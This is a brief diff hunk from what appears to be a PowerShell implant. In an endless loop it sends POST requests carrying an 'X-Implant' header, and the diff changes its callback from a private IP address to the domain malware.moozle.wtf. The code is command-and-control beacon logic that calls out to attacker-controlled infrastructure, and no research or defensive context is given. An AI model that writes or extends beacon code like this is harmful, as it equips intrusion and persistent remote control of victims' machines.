@@ -18,7 +18,7 @@ while($true){
     $headers = @{}
     $headers.Add("X-Implant","1234")
     try {
-        $LoginResponse = Invoke-WebRequest 'http://192.168.99.117:5000/index' -Headers $headers -Body $Body -Method 'POST'
+        $LoginResponse = Invoke-WebRequest 'http://malware.moozle.wtf:5000/index' -Headers $headers -Body $Body -Method 'POST'
         }
     catch {
         $_.Exception | format-list -Force
